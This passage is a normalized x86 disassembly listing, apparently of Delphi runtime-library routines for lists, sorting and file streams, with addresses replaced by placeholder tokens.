mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
lea edx [ eax + edx * 8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov ebx [ ebp - 0x8 ]
lea eax [ eax + ebx * 8 + 0x8 ]
call sub_44bbe8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
lea eax [ eax + edx * 8 ]
mov edx [ r-xdata ]
call sub_44d428
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jge r-xdata
sub_43e3ec
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d814
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43d814
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jl r-xdata
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43e464
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov esp ebp
pop ebp
retn
sub_43e464
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
lea eax [ eax + edx * 8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0xc ]
lea eax [ eax + edx * 8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov edx [ ebp - 0x14 ]
mov [ edx ] eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_43e4d0
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
mov [ eax ] edx
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x18 ]
shr eax 0x1
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x1c ]
mov eax [ eax + edx * 8 ]
mov edx [ ebp - 0x8 ]
call sub_4462cc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
mov eax [ ebp - 0x1c ]
dec eax
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19 ] 0x1
je r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
sub_43e564
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d814
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jl r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx [ ebp - 0x8 ]
mov edx [ edx + ecx * 8 ]
call sub_44cb34
mov esp ebp
pop ebp
retn
sub_43e5e8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d814
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ eax + edx * 8 + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_43e630
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x40
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x8
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
test eax eax
jns r-xdata
mov [ ebp - 0x8 ] 0x4
mov [ ebp - 0x8 ] 0x10
jmp r-xdata
sar eax 0x2
mov [ ebp - 0x8 ] eax
jmp r-xdata
add eax 0x3
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop ecx
pop ecx
pop ebp
retn
sub_43e688
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x78 ]
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43dafc
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] 0xffffffff
sub_43e6d0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_43d814
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d814
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jle r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43e72c
mov esp ebp
pop ebp
retn
sub_43e72c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e630
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
lea eax [ eax + edx * 8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
inc [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
lea edx [ eax + edx * 8 + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x8 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x10 ]
sub ecx [ ebp - 0x8 ]
shl ecx 0x3
call sub_44bbe8
sub_43e7cc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_43d814
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d814
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
lea eax [ eax + edx * 8 ]
mov edx [ ebp - 0xc ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov esp ebp
pop ebp
retn
sub_43e840
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d814
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + edx * 8 + 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov esp ebp
pop ebp
retn
sub_43e898
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43e464
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43e898
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_43e95c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
shl edx 0x3
mov eax [ ebp - 0x4 ]
add eax 0xc
call sub_44ba8c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_43e988
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x18 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43e9bc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_43e9e4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0xc ]
mov edx [ eax + edx * 8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + ecx * 8 ]
call sub_4462cc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_43ea38
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
dec ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43e898
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x70 ]
sub_43ea80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov cx 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43eaa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43eac4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] eax
mov cx 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov cx 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43eb18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
sub_43eb60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
sub_43eba8
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0xf000
jle r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_43eaa4
mov eax [ ebp - 0x8 ]
call sub_43eac4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ec6d
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
call sub_44ba74
retn
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_44ba5c
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_43ec66
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_43eb18
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43eb60
mov eax [ ebp - 0x18 ]
sub [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub_43ec74
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x1000
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f38c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43ecc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_441484
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ecd0
mov eax [ ebp - 0x10 ]
call sub_44c070
retn
sub_43ecd8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446544
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x10 ] eax
sub_43ed10
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44657c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x10 ] eax
sub_43ed48
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xa ] cx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
movzx ecx [ ebp - 0xa ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4465b4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_43ed74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetEndOfFile
call sub_448cc4
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43eda4
push ebp
mov ebp esp
add esp 0xffffffec
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_44c370
movzx edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4464c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jge r-xdata
mov eax [ ebp - 0xc ]
call sub_446510
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
call sub_44c7a8
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
call sub_44c7a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43ee6c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jl r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4465e0
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43eea4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov esp ebp
pop ebp
retn
sub_43eecc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jl r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0xc ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0xc ]
mov ecx [ ebp - 0x10 ]
call sub_44bbe8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_43ef3c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xa ] cx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ax [ ebp - 0xa ]
sub ax 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
add eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub_43ef94
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43efd0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43efd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43eff4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xc ] edx
pop ecx
pop ebp
retn
sub_43eff4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43eea4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_43f028
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43eff4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0xc ]
